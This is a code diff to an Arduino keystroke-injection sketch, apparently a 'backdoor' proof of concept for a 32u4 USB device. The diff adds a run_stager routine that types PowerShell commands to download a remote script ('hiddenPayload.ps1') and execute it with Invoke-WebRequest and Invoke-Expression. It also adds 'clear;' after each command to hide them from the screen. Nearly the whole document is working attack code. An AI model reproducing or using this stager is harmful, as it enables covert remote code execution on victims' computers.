@@ -4,6 +4,7 @@
 void open_run();
 void open_cmd();
 void send_payload();
+void run_stager();
 
 void setup() {
   Keyboard.begin();
@@ -11,9 +12,7 @@ void setup() {
   // Just some buffer room..
   delay(10000);
 
-  open_run();
-  open_cmd();
-  send_payload();
+  run_stager();
   
   Keyboard.end();
 }
@@ -28,11 +27,13 @@ void run_stager(){
   Keyboard.print("Powershell.exe");
   Keyboard.write(KEY_RETURN);
   delay(200);
-  Keyboard.print('$uri = "https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1";');
+  Keyboard.print("$uri = 'https://raw.githubusercontent.com/jarviscodes/32u4_backdoor_poc/master/test/hiddenPayload.ps1';clear;");
   Keyboard.write(KEY_RETURN);
-  Keyboard.print('$script_content = $(Invoke-WebRequest($uri)).Content;');
+  Keyboard.print("$script_content = $(Invoke-WebRequest($uri)).Content;clear;");
   Keyboard.write(KEY_RETURN);
-  Keyboard.print('Invoke-Expression $script_content ;');
+  Keyboard.print("Invoke-Expression $script_content;clear;");
+  Keyboard.write(KEY_RETURN);
+
 }
 
 void send_payload(){
